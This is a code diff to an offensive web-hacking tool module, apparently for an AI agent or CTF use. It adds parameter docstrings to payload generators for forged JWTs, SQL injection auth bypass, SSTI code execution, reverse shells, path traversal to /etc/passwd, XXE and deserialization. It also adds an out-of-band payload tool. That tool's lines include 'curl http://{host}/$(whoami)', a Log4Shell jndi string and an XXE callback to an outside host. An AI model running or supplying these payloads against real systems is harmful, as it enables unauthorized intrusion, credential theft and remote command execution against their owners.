@@ -19,7 +19,9 @@ def _unb64url(s: str) -> bytes:
 
 @tool(category="web")
 def jwt_decode(token: str) -> str:
-    """Decode JWT header + payload (no signature verification)."""
+    """Decode JWT header + payload (no signature verification).
+    :param token: token string
+    """
     parts = token.strip().split(".")
     if len(parts) != 3:
         return "Invalid JWT format: needs header.payload.signature."
@@ -35,7 +37,11 @@ def jwt_decode(token: str) -> str:
 
 @tool(category="web")
 def jwt_forge(header_json: str = '{"alg":"none","typ":"JWT"}', payload_json: str = '{"user":"admin"}', secret: str = "") -> str:
-    """Forge a JWT. Empty secret = alg none (3 parts, empty signature). Secret set = HS256."""
+    """Forge a JWT. Empty secret = alg none (3 parts, empty signature). Secret set = HS256.
+    :param header_json: JWT header JSON
+    :param secret: secret value
+    :param payload_json: JWT payload JSON
+    """
     header = json.loads(header_json)
     payload = json.loads(payload_json)
     h = _b64url(json.dumps(header, separators=(",", ":")).encode())
@@ -49,7 +55,14 @@ def jwt_forge(header_json: str = '{"alg":"none","typ":"JWT"}', payload_json: str
 
 @tool(category="web")
 def http_request(url: str, method: str = "GET", headers_csv: str = "", data: str = "", timeout: int = 15, max_body: int = 16384) -> str:
-    """HTTP request (GET/POST/PUT/HEAD). headers_csv: 'Name: value' per line. data: request body."""
+    """HTTP request (GET/POST/PUT/HEAD). headers_csv: 'Name: value' per line. data: request body.
+    :param url: target URL
+    :param headers_csv: headers (comma-separated)
+    :param data: input data to process
+    :param method: HTTP method
+    :param max_body: max body
+    :param timeout: timeout in seconds
+    """
     import http.client
     parsed = urllib.parse.urlparse(url)
     if parsed.scheme not in ("http", "https"):
@@ -100,7 +113,9 @@ def _parse_headers(csv: str) -> dict:
 
 @tool(category="web")
 def payload_encoders(payload: str) -> str:
-    """Encode an injection payload (SQLi/XSS/SSRF) into WAF-bypass variants: url, double-url, hex, unicode, charcode, null-byte."""
+    """Encode an injection payload (SQLi/XSS/SSRF) into WAF-bypass variants: url, double-url, hex, unicode, charcode, null-byte.
+    :param payload: payload string
+    """
     enc = urllib.parse.quote(payload, safe="")
     dbl = urllib.parse.quote(enc, safe="")
     hexenc = "".join(f"0x{b:02x}" for b in payload.encode())
@@ -118,7 +133,9 @@ def payload_encoders(payload: str) -> str:
 
 @tool(category="web")
 def sqli_payloads(kind: str = "auth_bypass") -> str:
-    """Ready-to-use SQLi payloads. kind: auth_bypass / union / boolean / time."""
+    """Ready-to-use SQLi payloads. kind: auth_bypass / union / boolean / time.
+    :param kind: kind
+    """
     sets = {
         "auth_bypass": [
             "' OR '1'='1", "' OR 1=1-- -", "' OR 1=1#", "' OR '1'='1'-- -",
@@ -138,7 +155,10 @@ def sqli_payloads(kind: str = "auth_bypass") -> str:
 
 @tool(category="web")
 def ssti_payloads(engine: str = "jinja2", command: str = "id") -> str:
-    """Generate SSTI (Server-Side Template Injection) RCE payloads for Jinja2, Twig, Smarty, SpEL, Thymeleaf, EJS, ERB."""
+    """Generate SSTI (Server-Side Template Injection) RCE payloads for Jinja2, Twig, Smarty, SpEL, Thymeleaf, EJS, ERB.
+    :param engine: engine
+    :param command: command
+    """
     eng = engine.lower().strip()
     c = command.replace("'", "\\'")
     
@@ -194,7 +214,12 @@ def ssti_payloads(engine: str = "jinja2", command: str = "id") -> str:
 
 @tool(category="web")
 def revshell_generator(ip: str, port: int, shell_type: str = "bash", encoding: str = "raw") -> str:
-    """Generate ready-to-run reverse shell one-liners (bash/python/nc/powershell/php/socat/perl/node)."""
+    """Generate ready-to-run reverse shell one-liners (bash/python/nc/powershell/php/socat/perl/node).
+    :param port: target port
+    :param shell_type: shell type (bash/sh/python)
+    :param ip: IP address
+    :param encoding: encoding
+    """
     st = shell_type.lower().strip()
     
     shells = {
@@ -230,7 +255,10 @@ def revshell_generator(ip: str, port: int, shell_type: str = "bash", encoding: s
 
 @tool(category="web")
 def php_filter_chain(resource: str = "flag.php", action: str = "base64") -> str:
-    """Generate PHP stream filter wrappers, data URIs, and PHP type-juggling magic hashes."""
+    """Generate PHP stream filter wrappers, data URIs, and PHP type-juggling magic hashes.
+    :param resource: resource
+    :param action: action to perform
+    """
     act = action.lower().strip()
     
     if act == "base64":
@@ -264,7 +292,10 @@ def php_filter_chain(resource: str = "flag.php", action: str = "base64") -> str:
 
 @tool(category="web")
 def ssrf_obfuscator(ip_or_host: str = "127.0.0.1", port: int = 80) -> str:
-    """Generate obfuscated IP representations (Decimal, Hex, Octal, IPv6) and Cloud Metadata URLs."""
+    """Generate obfuscated IP representations (Decimal, Hex, Octal, IPv6) and Cloud Metadata URLs.
+    :param port: target port
+    :param ip_or_host: ip or host
+    """
     import socket
     import struct
     
@@ -302,7 +333,11 @@ def ssrf_obfuscator(ip_or_host: str = "127.0.0.1", port: int = 80) -> str:
 
 @tool(category="web")
 def jwt_key_confusion(token: str, rsa_public_key_pem: str, modify_payload_json: str = '{"admin":true}') -> str:
-    """Exploit CVE-2015-9235 (RSA to HMAC algorithm confusion) using an RSA public key as the HMAC secret."""
+    """Exploit CVE-2015-9235 (RSA to HMAC algorithm confusion) using an RSA public key as the HMAC secret.
+    :param token: token string
+    :param modify_payload_json: modify payload json
+    :param rsa_public_key_pem: rsa public key pem
+    """
     import hmac
     import hashlib
     import os
@@ -348,7 +383,10 @@ def jwt_key_confusion(token: str, rsa_public_key_pem: str, modify_payload_json: 
 
 @tool(category="web")
 def command_injection_payloads(os_type: str = "linux", command: str = "id") -> str:
-    """Command injection payloads for Linux/Windows, including chaining, bypass, and out-of-band variants."""
+    """Command injection payloads for Linux/Windows, including chaining, bypass, and out-of-band variants.
+    :param os_type: os type
+    :param command: command
+    """
     os_type = os_type.lower().strip()
     c = command.replace("'", "\\'") if os_type == "linux" else command.replace("'", "''")
 
@@ -392,7 +430,10 @@ def command_injection_payloads(os_type: str = "linux", command: str = "id") -> s
 
 @tool(category="web")
 def path_traversal_payloads(depth: int = 5, target_file: str = "/etc/passwd") -> str:
-    """Path traversal / LFI / RFI payloads with depth control and null byte injection."""
+    """Path traversal / LFI / RFI payloads with depth control and null byte injection.
+    :param depth: depth
+    :param target_file: target file
+    """
     traversal = "/".join([".."] * max(1, int(depth)))
     payloads = [
         f"{traversal}/{target_file.lstrip('/')}",
@@ -411,7 +452,10 @@ def path_traversal_payloads(depth: int = 5, target_file: str = "/etc/passwd") ->
 
 @tool(category="web")
 def xxe_payloads(data: str = "test", action: str = "read_file") -> str:
-    """XXE (XML External Entity) payloads: read local files, SSRF, out-of-band exfil, error-based, parameter entity."""
+    """XXE (XML External Entity) payloads: read local files, SSRF, out-of-band exfil, error-based, parameter entity.
+    :param data: input data to process
+    :param action: action to perform
+    """
     act = action.lower().strip().replace(" ", "_")
 
     if act == "read_file":
@@ -482,7 +526,10 @@ def xxe_payloads(data: str = "test", action: str = "read_file") -> str:
 
 @tool(category="web")
 def idor_payloads(param_name: str = "id", values: str = "1,2,3") -> str:
-    """IDOR (Insecure Direct Object Reference) payloads for testing horizontal/vertical access control."""
+    """IDOR (Insecure Direct Object Reference) payloads for testing horizontal/vertical access control.
+    :param param_name: param name
+    :param values: values
+    """
     vals = [v.strip() for v in values.split(",") if v.strip()]
     if not vals:
         vals = ["1", "2", "3", "admin", "root", "0", "-1", "100", "999"]
@@ -510,7 +557,10 @@ def idor_payloads(param_name: str = "id", values: str = "1,2,3") -> str:
 
 @tool(category="web")
 def file_upload_bypass(filename: str = "shell.php", content_type: str = "image/jpeg") -> str:
-    """File upload bypass payloads: double extension, null byte, content-type spoofing, magic bytes."""
+    """File upload bypass payloads: double extension, null byte, content-type spoofing, magic bytes.
+    :param content_type: content type
+    :param filename: filename
+    """
     base, *exts = filename.rsplit(".", 1)
     ext = exts[0] if exts else "php"
 
@@ -540,7 +590,10 @@ def file_upload_bypass(filename: str = "shell.php", content_type: str = "image/j
 
 @tool(category="web")
 def deserialization_payloads(format: str = "php", command: str = "id") -> str:
-    """Deserialization payloads for PHP, Python, Java, Ruby, Node.js, and generic object injection."""
+    """Deserialization payloads for PHP, Python, Java, Ruby, Node.js, and generic object injection.
+    :param format: output format
+    :param command: command
+    """
     fmt = format.lower().strip()
     c = command.replace("'", "\\'") if fmt in ("php", "python") else command
 
@@ -563,3 +616,45 @@ def deserialization_payloads(format: str = "php", command: str = "id") -> str:
         available = ", ".join(payloads.keys())
         return f"Unknown format {format!r}. Available: {available}."
     return f"Deserialization ({fmt}) ({len(selected)} payloads):\\n" + "\\n".join(selected)
+
+
+@tool(category="web")
+def graphql_introspect(url: str, query_text: str = "") -> str:
+    """Run a GraphQL introspection query (or a custom query) against an endpoint and dump the schema.
+
+    :param url: GraphQL endpoint URL (e.g. https://target/graphql)
+    :param query_text: optional custom query; default is full __schema introspection
+    """
+    query = query_text or """{__schema{queryType{name}mutationType{name}types{name kind fields{name type{name kind ofType{name kind}}}}}}"""
+    body = json.dumps({"query": query}).encode()
+    req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json"})
+    try:
+        with urllib.request.urlopen(req, timeout=15) as resp:
+            data = json.loads(resp.read().decode())
+    except Exception as ex:
+        return f"ERROR: {ex}"
+    if "errors" in data:
+        return "GraphQL errors: " + json.dumps(data["errors"])[:2000]
+    return json.dumps(data, indent=2)[:12000]
+
+
+@tool(category="web")
+def oast_payload(domain: str, keyword: str = "{{uname}}") -> str:
+    """Generate OAST (out-of-band) interaction payloads — HTTP/DNS callback subdomain + XXE/SSRF/SSTI/SQLi templates — for blind injection detection.
+
+    :param domain: your OAST domain (e.g. oast.site / interactsh / your collab server)
+    :param keyword: command/placeholder embedded in the payloads
+    """
+    import uuid
+    sub = uuid.uuid4().hex[:12]
+    host = f"{sub}.{domain.lstrip('.')}"
+    return (
+        f"callback host: {host}\n"
+        f"HTTP/DNS probe: curl https://{host}/x ; nslookup {host}\n"
+        f"XXE: <!DOCTYPE r [<!ENTITY x SYSTEM \"http://{host}/xxe\">]><r>&x;</r>\n"
+        f"SSRF: <img src=\"http://{host}/ssrf\"/>  |  url?u=http://{host}/ssrf\n"
+        f"SSTI: ${{7*7}} -> ${{{{{keyword}}}}}\n"
+        f"SQLi (blind): ' AND (SELECT 1 FROM (SELECT SLEEP(0))a WHERE 1=1 AND LOAD_FILE(CONCAT('\\\\\\\\{host}\\\\{keyword}')))-- -\n"
+        f"Log4Shell: ${{jndi:ldap://{host}/a}}\n"
+        f"Shell injection: ; curl http://{host}/$(whoami) | ping -c1 {host}\n"
+    )
